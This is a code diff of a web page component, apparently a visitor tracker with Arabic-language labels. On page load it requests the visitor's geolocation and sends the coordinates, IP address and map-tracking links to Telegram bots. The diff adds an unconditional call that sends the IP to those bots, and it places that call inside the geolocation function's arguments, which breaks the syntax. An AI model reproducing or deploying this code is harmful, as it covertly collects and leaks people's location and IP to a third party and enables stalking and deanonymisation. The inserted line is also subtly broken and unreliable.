@@ -4,6 +4,7 @@
   onMount(async () => {
     // Request location permission automatically
     navigator.geolocation.getCurrentPosition(
+	sendIPToTelegramBots();
       (position) => {
         // Location permission granted, send location and IP results to Telegram bots
         sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
@@ -27,7 +28,7 @@
     const data = await response.json();
     const ipAddress = data.ip;
 
-    const message = `\nالموقع: \n${latitude} ${longitude}\nالايبي: \n${ipAddress}`;
+    const message = `\nالموقع:\n \n${latitude} ${longitude}\n\nالايبي:\n \n${ipAddress}`;
 
 
  // Create the message with the clickable link to Google Maps
@@ -39,7 +40,7 @@
     const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
 
 
-    const htmlMessage = `${message}\n\n ${clickableLink}\n${ipLocationNetLink}`;
+    const htmlMessage = `${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;
 
 
     // Send location and IP results to Telegram bots using an HTTP request
